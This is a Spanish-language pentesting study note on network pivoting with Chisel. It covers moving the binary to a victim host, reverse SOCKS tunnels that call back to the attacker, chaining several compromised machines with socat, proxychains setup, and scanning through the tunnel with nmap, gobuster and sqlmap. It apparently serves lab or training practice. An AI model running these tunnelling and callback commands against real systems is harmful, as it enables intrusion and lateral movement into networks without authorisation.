github.com/jpillora/chisel/releases --> _chisel_1.11.3_linux_amd64.gz_
---
La idea principal de Chisel, es que, vos como atacante **sos un servidor** y la maquina victima **es cliente**.

---
_1)_ Transferencia de Chisel a la maquina victima
Hay varias formas:

- Montarte servidor con python y hacer wget:

**ATACANTE**:
```bash
python3 -m http-server -p 80
```

**VICTIMA**:
```bash
wget http://192.168.111.1/chisel
```


- Enviandolo por ssh:
**ATACANTE**:
```bash
scp chisel root@192.168.111.128:/tmp/chisel
```

donde:
_192.168.111.128_ --> ip de la **VICTIMA**
_/tmp/chisel_ --> Directorio donde se va a guardar chisel

---
_2)_ Uso de chisel:

- **QUE HACE SOCKS??????**:  
    “Conectame a 10.0.0.5:80”  
    y él lo hace **por vos**.

_Es como decirle a la víctima_:
> _Che, conectate vos a esa IP/puerto y pasame la data._


- _Primero_: Establecerse como server en la maquina **ATACANTEEEE** -> 192.168.1.111:

```bash
chisel server --reverse -p 1234
```

- _Segundo_: Establecerse como cliente en la maquina **VICTIMA**

```bash
chisel client 192.168.111.1:1234 R:80:10.10.0.129:80
```
o
```bash
chisel client 192.168.111.1:1234 R:socks
```

_:1234_ -> Puerto del servidor donde chisel esta en escucha.

_R:80..._ -> Hace que cuando accedas al puerto 80 de tu maquina (_atacante_), veas el puerto 80 de la maquina _sin acceso_.

_R:socks_ -> Crea una especie de tunel, por defecto por el puerto 1080 (el puerto se abre en la maquina **atacante**), que cuando vos pasas por medio de el podes acceder a la maquina _sin acceso_
	Cuando realizamos un tunel socks, hay ciertas dificultades para utilizar las herramientas, hay que tocar un archivo de configuracion (**/etc/proxychains.conf**) y hacer lo siguiente:
		_1)_ Si es una sola maquina --> Comentar la linea `dynamic_chain`, o si son varias maquinas comentarla al comienzo y a la 2da ya descomentar y comentar `strict_chain`
		_2)_ Se descomenta `strict_chain` para obligar a que TODAS las conexiones pasen sí o sí por el proxy que definiste, en ese orden. 
		_3)_ Agregar la siguiente linea al final del archivo --> `socks5 127.0.0.1 1080`, que en el 1080 esta el socks que te dio la victima (a la que llegamos).

_R:9999:socks_ -> Le especificas en que puerto queres crear el tunel, a diferencia del comando anterior, que lo corre por defecto en el 1080.


![Screenshot](../../Images/pivoting_chisel1.png)

---
#### Que hacer cuando comprometemos mas maquinas
Bien, cuando comprometemos mas maquinas a las que no tenemos acceso desde la **atacante**, las siguientes victimas se van a ir conectando al servidor principal que creamos desde un comienzo. Supongamos que somos A (atacante) y queremos llegar a D:

```c
A -> B -> C -> D
```

**`A`** -> 192.168.1.1 - 192.168.100.1
**`B`** -> 192.168.100.2 - 10.10.0.1
**`C`** -> 10.10.0.2 - 20.20.0.1
**`D`** -> 20.20.0.2

##### **`A`**
Nos establecemos como servidor aca:
```bash
chisel server --reverse -p 1234
```

##### **`B`**
Comprometemos **`B`** y nos establecemos como cliente del servidor en `A`, por el puerto 9001, por ejemplo:
```bash
chisel client 192.168.1.1:1234 R:9001:socks
```

Y agregamos la siguiente linea **ABAJO DEL TODO** en el archivo proxychains.conf:
```
socks5 127.0.0.1 9001
```

##### **`C`**
Una vez comprometida la tercera maquina (**`C`**), nos bajamos socat **EN `B`** y redirigimos el trafico para **`A`**:
```bash
socat TCP-LISTEN:7001,fork TCP:10.10.0.128:1234
```
osea el socat hace que **`B`** sea el intermediario entre **`A`** y **`C`**

y ahora nos establecemos como cliente en **`C`**:
```bash
chisel client 192.168.111.1:1234 R:9002:socks
```
**NOTA**: a esto se lo mandamos al nodo mas cercano, _no al servidor_. El nodo por medio de socat se encarga de mandarlo al server.

En el servidor agreamos esta linea **ARRIBA DE LA OTRA** en proxychains.conf:
```
socks5 127.0.0.1 9002
```
**SE VAN PONIENDO UNA ARRIBA DE LA OTRA, NO ABAJO** QUEDA ASIIIIIIIII:
```bash
socks5 127.0.0.1 9004
socks5 127.0.0.1 9003
socks5 127.0.0.1 9002
socks5 127.0.0.1 9001
```

#### **MAPA MENTAL**
```c
[ SOCAT ]
7001 A<->B
7002 B<->C
7003 C<->D

[ CHISEL ]
9001 SOCKS B
9002 SOCKS C
9003 SOCKS D
```


### Cosas que cambian con un tunel Socks

_1)_ Escaneo de nmap: El escaneo se hace con proxychains y los parametros -Pn y -sT --> _TCP Connect_

```bash
proxychains nmap -p- --open -sT -Pn -vvv -n 10.10.0.128 -oG allPorts 
```
o mas rapido:
```bash
seq 1 65535 | xargs -P 500 -i {} proxychains nmap -p- --open -sT -Pn -vvv -n 10.10.0.128 -oG allPorts 
```
_-P_ -> Hilos

_2)_ El resto de herramientas tienen un uso normal, simplemente poniendo proxychains al comienzo:
```bash
proxychains gobuster dir -u https://url.com/ -w directory-list-small
gobuster dir -u https://url.com/ -w directory-list-small --proxy socks5://127.0.0.1:1080

proxychains sqlmap -u 'https://url.com?redirect=' --level 5 --batch -dbs
proxychains curl https://ipinfo.io/ip        
```

_3)_ Para llegar a una pagina web, hay 2 formas:
- Usar _FoxyProxy_ -> Opciones -> Proxies -> _Tipo_: Socks5 ,_Hostname_: 127.0.0.1, _Port_: 1080.
- Ejecutar firefox con proxychains -> `proxychains firefox`.
